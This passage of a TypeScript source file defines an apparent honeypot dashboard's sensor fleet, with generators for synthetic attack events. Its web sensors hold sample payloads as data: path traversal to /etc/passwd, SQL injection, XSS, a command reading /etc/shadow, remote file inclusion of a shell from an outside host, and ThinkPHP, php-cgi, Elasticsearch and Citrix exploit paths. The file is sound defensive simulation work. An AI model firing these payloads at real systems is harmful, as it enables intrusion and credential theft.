    ...CONPOT_SPEC,
    id: 'conpot-s7-1500',
    persona: { id: 'weserchem-s7-1500', organization: WESERCHEM, site: 'weserchem-reactor-2', assets: ['plc-reactor-02'] },
    what: 'Siemens S7-1500 PLC emulation: S7comm and Modbus against a large controller',
    protocols: ['modbus', 's7comm'],
    ports: [
      { proto: 'tcp', port: 2502 },
      { proto: 'tcp', port: 2102 },
    ],
    perDay: 80,
    lastSeenMinutes: 2,
    generate: (rng): EventDraft => conpotEvent(rng, [MODBUS(2502), MODBUS(2502), S7(2102)]),
  },
  {
    ...CONPOT_SPEC,
    id: 'conpot-iec104',
    persona: { id: 'moorland-iec104', organization: MOORLAND, site: 'moorland-substation-08', assets: ['rtu-sub08-a'] },
    what: 'IEC 60870-5-104 substation emulation: telecontrol start/stop and interrogation commands',
    protocols: ['iec104'],
    ports: [{ proto: 'tcp', port: 2404 }],
    perDay: 65,
    lastSeenMinutes: 2,
    generate: (rng): EventDraft =>
      conpotEvent(rng, [
        { dataType: 'IEC104', port: 2404, eventType: 'STARTDT act', request: "b'680407000000'", response: "b'68040b000000'", summary: 'IEC-104 STARTDT act' },
        { dataType: 'IEC104', port: 2404, eventType: 'C_IC_NA_1', request: "b'680e0000000064010600010000000014'", response: 'interrogation confirmed, 14 points', summary: 'IEC-104 general interrogation' },
      ]),
  },
  {
    id: 'http-honeypot',
    persona: { id: 'voltaris-edge', organization: VOLTARIS, site: 'voltaris-eu-edge', assets: ['web-edge-01'] },
    kind: 'HTTP honeypot',
    what: 'Web honeypot behind the reverse proxy: landing pages, logins and exploit paths, with tarpitting',
    protocols: ['http'],
    ports: [{ proto: 'tcp', port: 8080 }],
    ingress: ['traefik'],
    perDay: 60,
    status: 'online',
    lastSeenMinutes: 4,
    columns: [
      { header: 'request', field: 'path', mono: true },
      { header: 'category', field: 'category', badge: 'info' },
      { header: 'status', field: 'status' },
      { header: 'user agent', field: 'user_agent' },
    ],
    artefacts: [{ label: 'Headers', field: 'headers' }],
    tops: [
      { label: 'paths', field: 'path' },
      { label: 'categories', field: 'category' },
      { label: 'hosts', field: 'host' },
    ],
    measures: [
      { label: 'requests', match: has('path') },
      { label: 'login attempts', match: eq('category', 'login') },
      { label: 'exploit attempts', match: eq('category', 'exploit') },
      { label: 'tarpitted', match: (f) => f.tarpitted === true },
    ],
    generate: (rng): EventDraft => {
      // payload_class: what the request carried, when it carried something.
      const [path, category, severity, payloadClass] = pickSkewed(rng, [
        ['/', 'landing', 'info', ''],
        ['/wp-login.php', 'login', 'low', ''],
        ['/.env', 'scanner', 'medium', 'secret-read'],
        ['/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 'exploit', 'high', 'php-code'],
        ['/cgi-bin/luci/;stok=/locale?form=country', 'exploit', 'high', 'command-injection'],
        ['/boaform/admin/formLogin', 'login', 'medium', ''],
        ['/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array', 'exploit', 'high', 'thinkphp-rce'],
        ['/../../../../etc/passwd', 'exploit', 'high', 'path-traversal'],
        ['/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1', 'exploit', 'critical', 'php-cgi-argument-injection'],
        ['/wp-json/wp/v2/users', 'scanner', 'low', 'wordpress-rest-probe'],
      ] as const)
      const method = category === 'login' ? 'POST' : 'GET'
      const agent = pickSkewed(rng, SCANNER_AGENTS)
      const username = category === 'login' ? pickSkewed(rng, USERNAMES) : undefined
      const password = username ? pickSkewed(rng, PASSWORDS) : undefined
      const tarpitted = category === 'scanner' && rng() < 0.5
      return {
        type: 'http.request',
        severity,
        protocol: 'http',
        dstPort: 8080,
        eventName: category,
        summary: `${method} ${path}`,
        username,
        password,
        fields: { method, path, host: pick(rng, ['shop.example.test', 'wp.example.test', 'portal.example.test']), status: category === 'exploit' ? 500 : 200, category, user_agent: agent, headers: { 'User-Agent': agent, Accept: '*/*' }, ...(username ? { username, password, auth_type: 'form' } : {}), ...(payloadClass ? { payload_class: payloadClass } : {}), tarpitted, ...(tarpitted ? { tarpit_bytes: int(rng, 4096, 900_000), tarpit_ms: int(rng, 5_000, 120_000) } : {}), canonical_attck_techniques: severity === 'high' ? ['T1190'] : ['T1595'] },
      }
    },
  },
  {
    id: 'beelzebub',
    persona: { id: 'voltaris-directory', organization: VOLTARIS, site: 'voltaris-munich-core', assets: ['directory-estate'] },
    kind: 'Beelzebub',
    what: 'Multi-protocol deception: what the emulated service was asked for',
    protocols: ['http', 'ssh', 'tcp'],
    ports: [
      { proto: 'tcp', port: 8081 },
      { proto: 'tcp', port: 2224 },
      { proto: 'tcp', port: 3307 },
    ],
    ingress: ['portbridge'],
    perDay: 60,
    status: 'online',
    lastSeenMinutes: 42,
    columns: [
      { header: 'protocol', field: 'protocol', badge: 'info' },
      { header: 'request', field: 'path', mono: true },
      { header: 'status', field: 'status' },
    ],
    artefacts: [{ label: 'What the sensor recorded', field: 'event' }],
    tops: [
      { label: 'protocols', field: 'protocol' },
      { label: 'requests', field: 'path' },
    ],
    measures: [
      { label: 'HTTP requests', match: eq('protocol', 'HTTP') },
      { label: 'SSH commands', match: eq('protocol', 'SSH') },
    ],
    generate: (rng): EventDraft => {
      const roll = rng()
      if (roll < 0.15) {
        const command = pickSkewed(rng, COMMANDS)
        return { type: 'command.input', severity: 'medium', protocol: 'ssh', dstPort: 2224, eventName: 'SSH', summary: command, command, fields: { msg: 'New Event', protocol: 'SSH', status: 'Interaction', level: 'info', event: { Description: 'SSH interactive ChatGPT', User: 'root', Command: command, CommandOutput: '' } } }
      }
      if (roll < 0.55) return { type: 'connection', severity: 'info', protocol: 'tcp', dstPort: 3307, eventName: 'TCP', summary: 'TCP banner served (MySQL 8.0.29)', fields: { msg: 'New Event', protocol: 'TCP', status: 'Stateless', level: 'info', event: { Description: 'MySQL 8.0.29', Banner: '8.0.29' } } }
      const path = pickSkewed(rng, ['/', 'http://azenv.net/', '/wp-admin/', '/index.php?s=/Index/\\think\\app/invokefunction'])
      return { type: 'http.request', severity: path.includes('invokefunction') ? 'high' : 'low', protocol: 'http', dstPort: 8081, eventName: 'HTTP', summary: `GET ${path}`, fields: { msg: 'New Event', protocol: 'HTTP', path, status: 'Stateless', level: 'info', event: { Description: 'Wordpress 6.0', User: '', Headers: `[Key: User-Agent, values: ${pick(rng, SCANNER_AGENTS)}]` } } }
    },
  },
  {
    id: 'endlessh',
    persona: { id: 'voltaris-ssh-edge', organization: VOLTARIS, site: 'voltaris-eu-edge', assets: ['sshgw01'] },
    kind: 'Endlessh',
    what: 'SSH tarpit: how long a client was held on a banner that never ends',
    protocols: ['ssh'],
    ports: [{ proto: 'tcp', port: 2222 }],
    ingress: ['portbridge'],
    perDay: 40,
    status: 'online',
    lastSeenMinutes: 1,
    columns: [
      { header: 'event', field: 'event', mono: true },
      { header: 'held for', field: 'held_ms' },
      { header: 'banner lines', field: 'lines' },
    ],
    artefacts: [],
    tops: [{ label: 'events', field: 'event' }],
    measures: [
      { label: 'clients trapped', match: eq('event', 'connect') },
      { label: 'clients released', match: eq('event', 'disconnect') },
    ],
    generate: (rng): EventDraft => {
      if (rng() < 0.5) return { type: 'connection', severity: 'info', protocol: 'ssh', dstPort: 2222, eventName: 'connect', summary: 'Client trapped on an endless banner', fields: { event: 'connect', proto: 'ssh', port: 2222 } }
      const held = int(rng, 2_000, 3_600_000)
      return { type: 'connection', severity: 'info', protocol: 'ssh', dstPort: 2222, eventName: 'disconnect', summary: `Client held ${Math.round(held / 1000)}s`, fields: { event: 'disconnect', proto: 'ssh', port: 2222, held_ms: held, lines: Math.round(held / 10_000), bytes: Math.round(held / 10) } }
    },
  },
  {
    id: 'rdp-honeypot',
    persona: { id: 'voltaris-rdp-jump', organization: VOLTARIS, site: 'voltaris-eu-edge', assets: ['rdpgw01'] },
    kind: 'RDP honeypot',
    what: 'RDP: the credentials offered and the security protocols requested',
    protocols: ['rdp'],
    ports: [{ proto: 'tcp', port: 3389 }],
    ingress: ['portbridge'],
    perDay: 35,
    status: 'online',
    lastSeenMinutes: 12,
    columns: [
      { header: 'event', field: 'event', mono: true },
      { header: 'username', field: ['canonical_user', 'username'], mono: true },
      { header: 'password', field: 'canonical_pass', mono: true },
      { header: 'requested protocols', field: 'requested_protocols' },
    ],
    artefacts: [{ label: 'Captured exchange', field: 'data' }],
    tops: [
      { label: 'cookie usernames', field: 'username' },
      { label: 'requested protocols', field: 'requested_protocols' },
    ],
    measures: [
      { label: 'RDP connections', match: eq('event', 'connect') },
      { label: 'usernames offered', match: has('username') },
    ],
    generate: (rng): EventDraft => {
      const protocols = pickSkewed(rng, ['TLS+CredSSP', 'Standard RDP', 'TLS', 'TLS+CredSSP+RDSTLS'])
      if (rng() < 0.55) {
        const username = pickSkewed(rng, ['hello', 'administrator', 'admin', 'user', 'test'])
        // The cookie carries only a username; Standard RDP (no NLA) also
        // hands over the password in the clear.
        const password = protocols === 'Standard RDP' ? pickSkewed(rng, PASSWORDS) : ''
        return { type: 'login.failed', severity: 'low', protocol: 'rdp', dstPort: 3389, eventName: 'connect', summary: password ? `RDP login ${username}/${password}` : `RDP cookie mstshash=${username}`, username, password, fields: { event: 'connect', proto: 'rdp', port: 3389, username, canonical_user: username, canonical_pass: password, requested_protocols: protocols, data: `AwAAKybgAAAAAABDb29raWU6IG1zdHNoYXNoPS${hex(rng, 12)}`, canonical_attck_techniques: ['T1110'] } }
      }
      return { type: 'connection', severity: 'info', protocol: 'rdp', dstPort: 3389, eventName: 'connect', summary: `RDP connection (${protocols})`, fields: { event: 'connect', proto: 'rdp', port: 3389, requested_protocols: protocols, data: `TUdMTkREXz${hex(rng, 16)}` } }
    },
  },
  {
    id: 'tanner',
    persona: { id: 'kestrel-customer-portal', organization: KESTREL, site: 'kestrel-public-web', assets: ['customer-portal-01'] },
    kind: 'Snare/Tanner',
    what: 'Web application honeypot: requests classified by attack type (LFI, RFI, SQLi, XSS, command execution)',
    protocols: ['http'],
    ports: [{ proto: 'tcp', port: 80 }],
    ingress: ['traefik'],
    perDay: 35,
    status: 'degraded',
    lastSeenMinutes: 14,
    columns: [
      { header: 'request', field: 'path', mono: true },
      { header: 'detection', field: 'detection.name', badge: 'warning' },
      { header: 'status', field: 'status' },
    ],
    artefacts: [
      { label: 'Headers', field: 'headers' },
      { label: 'Detection payload', field: 'detection' },
    ],
    tops: [
      { label: 'paths', field: 'path' },
      { label: 'detections', field: 'detection.name' },
      { label: 'user agents', field: 'headers.user-agent' },
    ],
    measures: [
      { label: 'requests', match: has('path') },
      { label: 'attacks detected', match: (f) => (f.detection as { name?: string } | undefined)?.name !== 'index' },
    ],
    generate: (rng): EventDraft => {
      const [path, detection, severity] = pickSkewed(rng, [
        ['/', 'index', 'info'],
        ['/index.php?page=../../../../etc/passwd', 'lfi', 'high'],
        ['/?id=1%27%20OR%20%271%27=%271', 'sqli', 'high'],
        ['/search?q=%3Cscript%3Ealert(1)%3C/script%3E', 'xss', 'medium'],
        ['/?cmd=cat%20/etc/shadow', 'cmd_exec', 'high'],
        ['/?file=http://198.51.100.9/shell.txt', 'rfi', 'high'],
      ] as const)
      const agent = pickSkewed(rng, SCANNER_AGENTS)
      return { type: 'http.request', severity, protocol: 'http', dstPort: 80, eventName: detection, summary: `GET ${decodeURIComponent(path)}`, fields: { method: 'GET', path, status: 200, headers: { host: 'shop.example.test', accept: '*/*', 'user-agent': agent }, cookies: {}, detection: { name: detection, type: detection === 'index' ? 1 : 2, version: '0.6.0' }, canonical_fingerprint: agent, canonical_fingerprint_kind: 'User-Agent', canonical_attck_techniques: severity === 'high' ? ['T1190'] : ['T1595'] } }
    },
  },
  {
    id: 'citrix-honeypot',
    persona: { id: 'voltaris-citrix-gw', organization: VOLTARIS, site: 'voltaris-eu-edge', assets: ['citrixgw01'] },
    kind: 'Citrix ADC',
    what: 'HTTP requests against an emulated Citrix ADC gateway, including CVE-2019-19781 path traversal scans',
    protocols: ['https'],
    ports: [{ proto: 'tcp', port: 443 }],
    ingress: ['portbridge'],
    perDay: 33,
    status: 'online',
    lastSeenMinutes: 55,
    columns: [
      { header: 'request', field: ['path', 'url'], mono: true },
      { header: 'event', field: 'event', mono: true },
      { header: 'user agent', field: 'user_agent' },
    ],
    artefacts: [{ label: 'Headers', field: 'headers' }],
    tops: [
      { label: 'paths', field: 'path' },
      { label: 'JA4 fingerprints', field: 'canonical_fingerprint' },
    ],
    measures: [
      { label: 'requests', match: has('path') },
      { label: 'CVE-2019-19781 scans', match: (f) => String(f.path).includes('/vpns/') },
    ],
    generate: (rng): EventDraft => {
      const draft = httpLike(rng, {
        port: 443,
        proto: 'https',
        paths: [
          ['/', 'low'],
          ['/vpn/index.html', 'low'],
          ['/vpn/../vpns/cfg/smb.conf', 'high'],
          ['/vpn/../vpns/portal/scripts/newbm.pl', 'critical'],
        ],
      })
      const ja4 = pick(rng, ['t13i1909h2_9dc949149365_97f8aa674fd9', 't13d1516h2_8daaf6152771_02713d6af862', 't12d190800_c866b44c5a26_b5f5fa9a7e82'])
      if (String(draft.fields.path).includes('/vpns/')) draft.eventName = 'cve_2019_19781_scan'
      draft.fields = { ...draft.fields, event: draft.eventName, canonical_fingerprint: ja4, canonical_fingerprint_kind: 'JA4', headers: { ...(draft.fields.headers as Record<string, FieldValue>), 'x-ja3': hex(rng, 32) } }
      return draft
    },
  },
  {
    id: 'api-honeypot',
    persona: { id: 'voltaris-platform', organization: VOLTARIS, site: 'voltaris-eu-cloud', assets: ['platform-gw-01'] },
    kind: 'API honeypot',
    what: 'Fake API surface: the calls made against it and the status each got',
    protocols: ['http'],
    ports: [{ proto: 'tcp', port: 8082 }],
    ingress: ['traefik'],
    perDay: 31,
    status: 'online',
    lastSeenMinutes: 3,
    columns: [
      { header: 'request', field: 'path', mono: true },
      { header: 'method', field: 'method', mono: true },
      { header: 'status', field: 'status' },
      { header: 'user agent', field: 'user_agent' },
    ],
    artefacts: [{ label: 'Headers', field: 'headers' }],
    tops: [
      { label: 'endpoints', field: 'path' },
      { label: 'user agents', field: 'user_agent' },
    ],
    measures: [
      { label: 'API calls', match: has('path') },
      { label: 'unauthorized (401/403)', match: (f) => f.status === 401 || f.status === 403 },
    ],
    generate: (rng): EventDraft => {
      const [method, path, status, severity] = pickSkewed(rng, [
        ['GET', '/api/v1/users', 401, 'low'],
        ['GET', '/actuator/env', 200, 'medium'],
        ['POST', '/api/v1/auth/login', 403, 'low'],
        ['GET', '/v2/api-docs', 200, 'low'],
        ['GET', '/api/v1/pods', 401, 'medium'],
        ['POST', '/api/v1/admin/exec', 500, 'high'],
      ] as const)
      const agent = pickSkewed(rng, SCANNER_AGENTS)
      return { type: 'http.request', severity, protocol: 'http', dstPort: 8082, eventName: 'request', summary: `${method} ${path}`, fields: { method, path, status, host: 'api.example.test', category: 'api', user_agent: agent, headers: { 'User-Agent': agent, Accept: 'application/json' } } }
    },
  },
  {
    id: 'dnp3',
    persona: { id: 'moorland-dnp3', organization: MOORLAND, site: 'moorland-substation-11', assets: ['rtu-sub11-b'] },
    kind: 'DNP3',
    what: 'DNP3: the function codes requested against the emulated outstation',
    protocols: ['dnp3'],
    ports: [{ proto: 'tcp', port: 20000 }],
    ingress: ['portbridge'],
    perDay: 29,
    status: 'online',
    lastSeenMinutes: 20,
    columns: [
      { header: 'event', field: 'event', mono: true },
      { header: 'function', field: 'function', mono: true },
      { header: 'application function', field: 'app_function', mono: true },
    ],
    artefacts: [{ label: 'Raw frame', field: 'frame_hex' }],
    tops: [
      { label: 'link functions', field: 'function' },
      { label: 'application functions', field: 'app_function' },
    ],
    measures: [
      { label: 'frames', match: eq('event', 'frame') },
      { label: 'malformed frames', match: eq('event', 'malformed_frame') },
      { label: 'operate commands', match: (f) => String(f.app_function ?? '').includes('operate') },
    ],
    generate: (rng): EventDraft => {
      const roll = rng()
      if (roll < 0.4) return { type: 'protocol.request', severity: 'low', protocol: 'dnp3', dstPort: 20000, eventName: 'malformed_frame', summary: 'DNP3 malformed frame', fields: { event: 'malformed_frame', port: 20000, frame_hex: hex(rng, 24) } }
      if (roll < 0.5) return { type: 'connection', severity: 'info', protocol: 'dnp3', dstPort: 20000, eventName: 'connect', summary: 'DNP3 connection', fields: { event: 'connect', port: 20000 } }
      // Real frames mostly carry an application function, and most of those
      // are DIRECT_OPERATE: command a device with no select-before-operate.
      const fn = rng() < 0.2 ? pick(rng, ['reset_link_states', 'request_link_status']) : 'unconfirmed_user_data'
      const app = fn === 'unconfirmed_user_data' ? pickSkewed(rng, ['direct_operate', 'direct_operate', 'read', 'select', 'cold_restart']) : undefined
      return { type: 'protocol.request', severity: app === 'direct_operate' ? 'critical' : app === 'select' || app === 'cold_restart' ? 'high' : 'medium', protocol: 'dnp3', dstPort: 20000, eventName: 'frame', summary: `DNP3 ${app ?? fn}`, fields: { event: 'frame', port: 20000, function: fn, ...(app ? { app_function: app } : {}), dnp3_destination: 1, frame_hex: `056405c9${hex(rng, 20)}` } }
    },
  },
  {
    id: 'dns-honeypot',
    persona: { id: 'voltaris-dns', organization: VOLTARIS, site: 'voltaris-eu-edge', assets: ['dns01'] },
    kind: 'DNS honeypot',
    what: 'DNS: the names queried and the record types asked for',
    protocols: ['dns'],
    ports: [
      { proto: 'udp', port: 53 },
      { proto: 'tcp', port: 53 },
    ],
    ingress: ['portbridge'],
    perDay: 10,
    status: 'online',
    lastSeenMinutes: 35,
    columns: [
      { header: 'query', field: 'query', mono: true },
      { header: 'type', field: 'qtype', badge: 'info' },
      { header: 'transport', field: 'proto' },
      { header: 'recursion', field: 'rd' },
    ],
    artefacts: [],
    tops: [
      { label: 'names', field: 'query' },
      { label: 'record types', field: 'qtype' },
    ],
    measures: [
      { label: 'queries', match: eq('event', 'query') },
      { label: 'ANY queries (amplification)', match: (f) => f.qtype === 255 },
    ],
    generate: (rng): EventDraft => {
      const [query, qtype] = pickSkewed(rng, [
        ['version.bind', 16],
        ['example.test', 255],
        ['sl', 255],
        ['google.com', 1],
        ['.', 2],
      ] as const)
      const summary = `DNS ${qtype === 255 ? 'ANY' : qtype === 16 ? 'TXT' : qtype === 2 ? 'NS' : 'A'} ${query}`
      return { type: 'protocol.request', severity: qtype === 255 ? 'medium' : 'low', protocol: 'dns', dstPort: 53, eventName: 'query', summary, fields: { event: 'query', query, qtype, rd: true, proto: 'dns', port: 53, req_bytes: int(rng, 28, 60), resp_bytes: qtype === 255 ? int(rng, 400, 3000) : int(rng, 40, 120) } }
    },
  },
  {
    id: 'elasticpot',
    persona: { id: 'voltaris-analytics-legacy', organization: VOLTARIS, site: 'voltaris-munich-analytics', assets: ['analytics-es-02'] },
    kind: 'Elasticpot',
    what: 'Elasticsearch emulation: the queries and URLs attackers sent',
    protocols: ['http'],
    ports: [{ proto: 'tcp', port: 9201 }],
    ingress: ['portbridge'],
    perDay: 8,
    status: 'online',
    lastSeenMinutes: 70,
    columns: [
      { header: 'url', field: 'url', mono: true },
      { header: 'event', field: 'eventid', mono: true },
    ],
    artefacts: [
      { label: 'Request', field: 'request' },
      { label: 'What the sensor recorded', field: 'message' },
    ],
    tops: [{ label: 'URLs', field: 'url' }],
    measures: [
      { label: 'recon requests', match: eq('eventid', 'elasticpot.recon') },
      { label: 'attacks', match: eq('eventid', 'elasticpot.attack') },
    ],
    generate: (rng): EventDraft => {
      const attack = rng() < 0.1
      const url = attack ? '/_search?source={"script_fields":{"x":{"script":"java.lang.Runtime.getRuntime().exec(\'id\')"}}}' : pickSkewed(rng, ['/', '/_cat/indices', '/_nodes', '/favicon.ico'])
      return { type: 'http.request', severity: attack ? 'high' : 'low', protocol: 'http', dstPort: 9201, eventName: attack ? 'elasticpot.attack' : 'elasticpot.recon', summary: `GET ${url}`, fields: { eventid: attack ? 'elasticpot.attack' : 'elasticpot.recon', request: 'GET', url, message: attack ? 'Exploit' : 'Scan', user_agent: pick(rng, SCANNER_AGENTS), dst_port: 9200 } }
    },
  },
  {
    id: 'mailoney',
    kind: 'Mailoney',
    what: 'SMTP: the envelopes and messages spammers and relay testers send',
    protocols: ['smtp'],
    ports: [{ proto: 'tcp', port: 25 }],
    ingress: ['portbridge'],
    perDay: 7,
    status: 'online',
    lastSeenMinutes: 40,
    columns: [
      { header: 'event', field: 'event', mono: true },
      { header: 'command', field: 'command', mono: true },
    ],
    artefacts: [{ label: 'SMTP exchange', field: 'command' }],
    tops: [
      { label: 'senders', field: 'mail_from' },
      { label: 'recipients', field: 'rcpt_to' },
    ],
    measures: [
      { label: 'envelopes', match: eq('event', 'envelope') },
      { label: 'messages', match: eq('event', 'mail-body') },
    ],
    generate: (rng): EventDraft => {
      const from = pick(rng, ['spameri@example.test', 'info@example.test', 'noreply@example.test'])
      const to = pick(rng, ['receiver@example.test', 'test@example.test'])
      const session_id = String(int(rng, 1000, 9999))
      if (rng() < 0.7) return { type: 'protocol.request', severity: 'low', protocol: 'smtp', dstPort: 25, eventName: 'envelope', summary: `MAIL FROM:<${from}> RCPT TO:<${to}>`, fields: { event: 'envelope', session_id, server_name: 'mail01.example.test', command: `mail from:<${from}>\r\nrcpt to:<${to}>`, mail_from: from, rcpt_to: to, dst_port: 25 } }
      return { type: 'protocol.request', severity: 'medium', protocol: 'smtp', dstPort: 25, eventName: 'mail-body', summary: `Message from ${from} (${int(rng, 1, 40)} KB)`, fields: { event: 'mail-body', session_id, server_name: 'mail01.example.test', mail_from: from, rcpt_to: to, body_preview: 'Subject: relay test\r\n\r\nThis is a relay test from 198.51.100.77.', dst_port: 25 } }
    },
  },
  {
    id: 'dicompot',
    persona: { id: 'voltaris-imaging', organization: VOLTARIS, site: 'voltaris-radiology-archive', assets: ['pacs01'] },
    kind: 'DICOMpot',
    what: 'DICOM: which application entities tried to talk to the emulated imaging node',
    protocols: ['dicom'],
    ports: [{ proto: 'tcp', port: 11112 }],
    ingress: ['portbridge'],
    perDay: 7,
    status: 'online',
    lastSeenMinutes: 230,
    columns: [
      { header: 'event', field: 'event', mono: true },
      { header: 'calling AE', field: 'calling_ae', mono: true },
      { header: 'called AE', field: 'called_ae', mono: true },
    ],
    artefacts: [],
    tops: [
      { label: 'operations', field: 'event' },
      { label: 'calling AEs', field: 'calling_ae' },
    ],
    measures: [
      { label: 'associations', match: eq('event', 'associate') },
      { label: 'queries (C-FIND)', match: eq('event', 'c_find') },
      { label: 'stores (C-STORE)', match: eq('event', 'c_store') },
    ],
    generate: (rng): EventDraft => {
      const event = pickSkewed(rng, ['connect', 'associate', 'c_echo', 'c_find', 'c_store'])
      const calling = pick(rng, ['ANY-SCU', 'FINDSCU', 'STORESCU', 'NMAP'])
      return { type: event === 'connect' ? 'connection' : 'protocol.request', severity: event === 'c_store' ? 'high' : event === 'c_find' ? 'medium' : 'info', protocol: 'dicom', dstPort: 11112, eventName: event, summary: `DICOM ${event.replace('_', '-').toUpperCase()} from ${calling}`, fields: { event, proto: 'dicom', port: 11112, ...(event === 'connect' ? {} : { calling_ae: calling, called_ae: 'ANY-SCP' }) } }
    },
  },
  {
    id: 'galah',
    persona: { id: 'kestrel-staff-console', organization: KESTREL, site: 'kestrel-internal-tools', assets: ['staff-console-03'] },
    kind: 'Galah',
    what: 'LLM-generated web responses: the full request received and the response served back',
    protocols: ['http'],
    ports: [
      { proto: 'tcp', port: 8888 },
      { proto: 'tcp', port: 8890 },
    ],
    ingress: ['portbridge'],
    perDay: 3,
    status: 'online',
    lastSeenMinutes: 310,
    columns: [
      { header: 'request', field: 'path', mono: true },
      { header: 'source', field: 'responseMetadata.generationSource', badge: 'info' },
      { header: 'user agent', field: 'user_agent' },
    ],
    artefacts: [
      { label: 'Request', field: 'httpRequest' },
      { label: 'Response served', field: 'httpResponse' },
    ],
    tops: [
      { label: 'paths', field: 'path' },
      { label: 'response source', field: 'responseMetadata.generationSource' },
    ],
    measures: [
      { label: 'responses generated', match: (f) => (f.responseMetadata as { generationSource?: string } | undefined)?.generationSource === 'llm' },
      { label: 'served from cache', match: (f) => (f.responseMetadata as { generationSource?: string } | undefined)?.generationSource === 'cache' },
    ],
    generate: (rng): EventDraft => {
      const path = pick(rng, ['/', '/admin/config.php', '/login.cgi', '/api/status'])
      const agent = pick(rng, SCANNER_AGENTS)
      const source = rng() < 0.6 ? 'cache' : 'llm'
      const body = path === '/' ? '<html><body>It works!</body></html>' : '<html><head><title>Login</title></head><body><form method="post"><input name="user"><input type="password" name="pass"></form></body></html>'
      return { type: 'http.request', severity: 'low', protocol: 'http', dstPort: 8888, eventName: 'successfulResponse', summary: `GET ${path} (${source === 'llm' ? 'LLM-generated' : 'cached'} response)`, fields: { msg: 'successfulResponse', path, protocol: 'HTTP', port: '8888', user_agent: agent, httpRequest: { method: 'GET', request: path, headers: `User-Agent: ${agent}`, body: '' }, httpResponse: { headers: { Server: 'Apache/2.2.15', 'Content-Type': 'text/html' }, body }, responseMetadata: { generationSource: source, info: source === 'llm' ? { provider: 'local', model: 'mock-model' } : {} }, body_sha256: hex(rng, 64) } }
    },
  },
  {
    id: 'canarytokens',
    kind: 'Canarytokens',
    what: 'Canarytokens: which planted token fired, and what the trigger carried',
    protocols: ['http', 'dns'],
    ports: [],
    ingress: ['traefik'],
    perDay: 0,
    status: 'online',
    lastSeenMinutes: 60 * 24 * 9,
    columns: [
      { header: 'token type', field: 'token_type', badge: 'warning' },
      { header: 'channel', field: 'channel' },
      { header: 'memo', field: 'memo' },
    ],
    artefacts: [
      { label: 'Trigger data', field: 'src_data' },
      { label: 'Additional data', field: 'additional_data' },
    ],
    tops: [{ label: 'token types', field: 'token_type' }],
    measures: [{ label: 'tokens fired', match: has('token_type') }],
    generate: (rng): EventDraft => ({ type: 'protocol.request', severity: 'critical', protocol: 'http', dstPort: 443, eventName: 'trigger', summary: 'Canarytoken fired', fields: { token_type: pick(rng, ['aws_keys', 'windows_dir', 'adobe_pdf']), channel: 'HTTP', memo: 'Planted token', additional_data: { useragent: pick(rng, SCANNER_AGENTS) } } }),
  },
  {
    id: 'suricata',
    kind: 'Suricata IDS',
    what: 'Network IDS on the edge: signature alerts over the traffic the portbridge forwards',
    protocols: ['tcp', 'udp'],
    ports: [],
    ingress: ['direct'],
    perDay: 90,
    status: 'offline',
    lastSeenMinutes: 190,
    columns: [
      { header: 'signature', field: 'alert.signature' },
      { header: 'category', field: 'alert.category', badge: 'warning' },
      { header: 'protocol', field: 'app_proto', badge: 'info' },
    ],
    artefacts: [{ label: 'Alert', field: 'alert' }],
    tops: [
      { label: 'signatures', field: 'alert.signature' },
      { label: 'categories', field: 'alert.category' },
    ],
    measures: [
      { label: 'alerts', match: has('alert') },
      { label: 'exploit signatures', match: (f) => String((f.alert as { signature?: string } | undefined)?.signature ?? '').startsWith('ET EXPLOIT') },
    ],
    generate: (rng): EventDraft => {
      const [signature, category, app_proto, port, severity] = pickSkewed(rng, [
        ['ET SCAN Potential SSH Scan', 'Attempted Information Leak', 'ssh', 22, 'medium'],
        ['ET SCAN Potential Telnet Scan', 'Attempted Information Leak', 'telnet', 23, 'medium'],
        ['ET EXPLOIT Possible EternalBlue MS17-010', 'Attempted Administrator Privilege Gain', 'smb', 445, 'high'],
        ['ET SCAN Suspicious inbound to mySQL port 3306', 'Potentially Bad Traffic', 'mysql', 3306, 'medium'],
        ['ET SCAN MS Terminal Server Traffic on Non-standard Port', 'Attempted Information Leak', 'rdp', 3389, 'medium'],
        ['ET SCAN Sipvicious User-Agent Detected', 'Attempted Information Leak', 'sip', 5060, 'medium'],
        ['ET SCAN Modbus Scanning detected', 'Attempted Information Leak', 'modbus', 502, 'high'],
      ] as const)
      return { type: 'ids.alert', severity, protocol: app_proto, dstPort: port, eventName: 'alert', summary: signature, fields: { event_type: 'alert', app_proto, dest_port: port, alert: { signature, signature_id: 2_000_000 + int(rng, 1000, 39999), category, severity: severity === 'high' ? 1 : 2, action: 'allowed' } } }
    },
  },
]

export const specOf = (sensor: string): SensorSpec | undefined => FLEET.find((s) => s.id === sensor)
